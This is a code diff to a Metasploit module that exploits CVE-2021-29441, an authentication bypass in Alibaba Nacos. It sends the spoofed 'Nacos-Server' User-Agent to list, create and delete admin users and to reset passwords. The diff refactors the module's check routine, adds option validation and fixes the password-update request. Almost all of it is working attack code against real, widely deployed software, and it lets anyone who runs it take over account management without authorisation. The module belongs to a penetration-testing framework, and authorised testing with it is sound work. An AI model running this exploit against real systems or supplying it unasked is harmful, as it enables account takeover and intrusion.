@@ -11,38 +11,33 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'        => 'Nacos Authentication Bypass User Management',
+        'Name' => 'Nacos Authentication Bypass User Management',
         'Description' => %q{
           This module exploits an authentication bypass vulnerability in Alibaba Nacos
           versions prior to 1.4.1. By using the special User-Agent header 'Nacos-Server',
           an attacker can bypass authentication and perform administrative actions such
           as listing, creating, deleting, and updating user passwords.
         },
-        'Author'      => ['K3ysTr0K3R'],
-        'References'  =>
-          [
-            ['CVE', '2021-29441'],
-            ['URL', 'https://github.com/alibaba/nacos/issues/4562'],
-            ['URL', 'https://github.com/ARPSyndicate/cvemon/blob/master/CVE-2021-29441'],
-            ['URL', 'https://github.com/K3ysTr0K3R/CVE-2021-29441'],
-          ],
-        'License'     => MSF_LICENSE,
-        'Actions'     =>
-          [
-            ['CHECK', { 'Description' => 'Check if the target is vulnerable' }],
-            ['LIST_USERS', { 'Description' => 'List existing users' }],
-            ['CREATE_USER', { 'Description' => 'Create a new user' }],
-            ['DELETE_USER', { 'Description' => 'Delete a user' }],
-            ['UPDATE_PASSWORD', { 'Description' => 'Update a user\'s password' }],
-            ['CHECK_AND_CREATE', { 'Description' => 'Check vulnerability and, if vulnerable, create a new user' }]
-          ],
-        'DefaultAction' => 'CHECK_AND_CREATE',
-        'Notes'        =>
-          {
-            'Stability'   => [CRASH_SAFE],
-            'Reliability' => [REPEATABLE_SESSION],
-            'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
-          }
+        'Author' => ['K3ysTr0K3R'],
+        'References' => [
+          ['CVE', '2021-29441'],
+          ['URL', 'https://github.com/alibaba/nacos/issues/4562'],
+          ['URL', 'https://github.com/ARPSyndicate/cvemon/blob/master/CVE-2021-29441'],
+          ['URL', 'https://github.com/K3ysTr0K3R/CVE-2021-29441'],
+        ],
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          ['LIST_USERS', { 'Description' => 'List existing users' }],
+          ['CREATE_USER', { 'Description' => 'Create a new user' }],
+          ['DELETE_USER', { 'Description' => 'Delete a user' }],
+          ['UPDATE_PASSWORD', { 'Description' => 'Update a user\'s password' }]
+        ],
+        'DefaultAction' => 'LIST_USERS',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK, ACCOUNT_LOCKOUTS]
+        }
       )
     )
 
@@ -50,25 +45,56 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(8848),
         OptString.new('TARGETURI', [true, 'Base path to Nacos', '/']),
-        OptString.new('NEW_USERNAME', [true, 'User to create', Faker::Internet.username], conditions: %w[ACTION == CREATE_USER, ACTION == CHECK_AND_CREATE]),
-        OptString.new('PASSWORD', [true, 'Password for user creation'], conditions: %w[ACTION == CREATE_USER, ACTION == CHECK_AND_CREATE]),
-        OptString.new('USERNAME_TO_DELETE', [true, 'User to delete', Faker::Internet.username], conditions: %w[ACTION == DELETE_USER]),
-        OptString.new('USERNAME', [true, 'User'], conditions: %w[ACTION == UPDATE_PASSWORD]),
-        OptString.new('NEW_PASSWORD', [true, 'New password'], conditions: %w[ACTION == UPDATE_PASSWORD])
+        OptString.new('NEW_USERNAME', [false, 'User to create', Faker::Internet.username], conditions: %w[ACTION == CREATE_USER]),
+        OptString.new('PASSWORD', [false, 'Password for user creation'], conditions: %w[ACTION == CREATE_USER]),
+        OptString.new('USERNAME_TO_DELETE', [false, 'User to delete'], conditions: %w[ACTION == DELETE_USER]),
+        OptString.new('USERNAME', [false, 'User whose password will be updated'], conditions: %w[ACTION == UPDATE_PASSWORD]),
+        OptString.new('NEW_PASSWORD', [false, 'New password'], conditions: %w[ACTION == UPDATE_PASSWORD])
       ]
     )
   end
 
+  def check
+    validation_error = validate
+    return Exploit::CheckCode::Unknown(validation_error) if validation_error
+
+    unauthenticated_res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
+      'vars_get' => { 'pageNo' => 1, 'pageSize' => 1 }
+    )
+
+    return Exploit::CheckCode::Unknown('No response from target') unless unauthenticated_res
+
+    if unauthenticated_res.code == 200 && unauthenticated_res.get_json_document&.key?('pageItems')
+      return Exploit::CheckCode::Safe('Nacos authentication does not appear to be enabled')
+    end
+
+    unless unauthenticated_res.code == 403
+      return Exploit::CheckCode::Unknown("Unexpected response to unauthenticated request: HTTP #{unauthenticated_res.code}")
+    end
+
+    bypass_res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
+      'vars_get' => { 'pageNo' => 1, 'pageSize' => 1 },
+      'headers' => { 'User-Agent' => 'Nacos-Server' }
+    )
+
+    return Exploit::CheckCode::Unknown('No response to authentication bypass request') unless bypass_res
+
+    if bypass_res.code == 200 && bypass_res.get_json_document&.key?('pageItems')
+      return Exploit::CheckCode::Vulnerable('Successfully bypassed Nacos authentication')
+    end
+
+    Exploit::CheckCode::Safe('Target does not appear vulnerable')
+  end
+
   def run
+    validation_error = validate
+    fail_with(Failure::BadConfig, validation_error) if validation_error
+
     case action.name
-    when 'CHECK'
-      check
-    when 'CHECK_AND_CREATE'
-      if check == Exploit::CheckCode::Appears
-        create_user
-      else
-        print_error('Target does not appear vulnerable - aborting.')
-      end
     when 'LIST_USERS'
       list_users
     when 'CREATE_USER'
@@ -80,24 +106,25 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  private
+  def validate
+    required_options = case action.name
+                       when 'CREATE_USER'
+                         %w[NEW_USERNAME PASSWORD]
+                       when 'DELETE_USER'
+                         %w[USERNAME_TO_DELETE]
+                       when 'UPDATE_PASSWORD'
+                         %w[USERNAME NEW_PASSWORD]
+                       else
+                         []
+                       end
 
-  def check
-    res = send_request_cgi(
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
-      'vars_get' => { 'pageNo' => 1, 'pageSize' => 1 },
-      'headers' => { 'User-Agent' => 'Nacos-Server' }
-    )
+    missing_options = required_options.select { |option| datastore[option].blank? }
+    return if missing_options.empty?
 
-    return Exploit::CheckCode::Unknown('No response from target') unless res
-
-    if res.code == 200 && res.get_json_document&.key?('pageItems')
-      return Exploit::CheckCode::Appears('Target appears vulnerable to Nacos authentication bypass')
-    end
-
-    Exploit::CheckCode::Safe('Target does not appear vulnerable')
+    "The following options are required for #{action.name}: #{missing_options.join(', ')}"
   end
+
+  private
 
   def list_users
     print_status('Listing users...')
@@ -158,11 +185,12 @@ class MetasploitModule < Msf::Auxiliary
       'vars_post' => { 'username' => username, 'password' => password }
     )
 
-    if res && res.code == 200
-      print_good("User #{username} with password #{password} created successfully")
-    else
-      print_error("Failed to create user: #{res&.code} #{res&.body}")
-    end
+    fail_with(Failure::Unreachable, 'No response from target') unless res
+
+    json = res.get_json_document
+    fail_with(Failure::UnexpectedReply, "Failed to create user: HTTP #{res.code} #{json['message'] || res.body}") unless res.code == 200 && json['code'] == 200
+
+    print_good("User '#{username}' created successfully")
   end
 
   def delete_user
@@ -177,11 +205,12 @@ class MetasploitModule < Msf::Auxiliary
       'headers' => { 'User-Agent' => 'Nacos-Server' }
     )
 
-    if res && res.code == 200
-      print_good("User '#{username}' deleted successfully")
-    else
-      print_error("Failed to delete user: #{res&.code} #{res&.body}")
-    end
+    fail_with(Failure::Unreachable, 'No response from target') unless res
+
+    json = res.get_json_document
+    fail_with(Failure::UnexpectedReply, "Failed to delete user: HTTP #{res.code} #{json['message'] || res.body}") unless res.code == 200 && json['code'] == 200
+
+    print_good("User '#{username}' deleted successfully")
   end
 
   def update_password
@@ -193,14 +222,15 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi(
       'method' => 'PUT',
       'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
-      'vars_get' => { 'username' => username, 'password' => new_password },
+      'vars_get' => { 'username' => username, 'newPassword' => new_password },
       'headers' => { 'User-Agent' => 'Nacos-Server' }
     )
 
-    if res && res.code == 200
-      print_good("Password for '#{username}' updated successfully")
-    else
-      print_error("Failed to update password: #{res&.code} #{res&.body}")
-    end
+    fail_with(Failure::Unreachable, 'No response from target') unless res
+
+    json = res.get_json_document
+    fail_with(Failure::UnexpectedReply, "Failed to update password: HTTP #{res.code} #{json['message'] || res.body}") unless res.code == 200 && json['code'] == 200
+
+    print_good("Password for '#{username}' updated successfully")
   end
 end
